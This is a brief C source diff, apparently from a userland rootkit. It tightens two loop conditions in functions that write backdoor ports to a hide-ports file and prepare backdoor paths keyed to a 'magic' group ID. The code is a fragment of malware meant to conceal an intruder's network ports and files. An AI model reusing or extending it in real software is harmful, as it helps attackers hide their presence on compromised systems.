@@ -60,7 +60,7 @@ void preparehideports(gid_t magicgid){
     FILE *fp = call(CFOPEN, HIDEPORTS, "a");
     if(fp == NULL) return;
 
-    for(int i = 0; i != BDVLPORTS_SIZE; i++)
+    for(int i = 0; i < BDVLPORTS_SIZE; i++)
         fprintf(fp, "%d\n", bdvlports[i]);
 
     fclose(fp);
@@ -72,7 +72,7 @@ void bdprep(void){
     char *curpath;
     gid_t magicgid = readgid();
     int dirs=0, regs=0;
-    for(int i = 0; i != BDVPATHS_SIZE; i++){
+    for(int i = 0; i < BDVPATHS_SIZE; i++){
         curpath = bdvpaths[i];
 
         if(curpath[strlen(curpath)-1] == '/'){
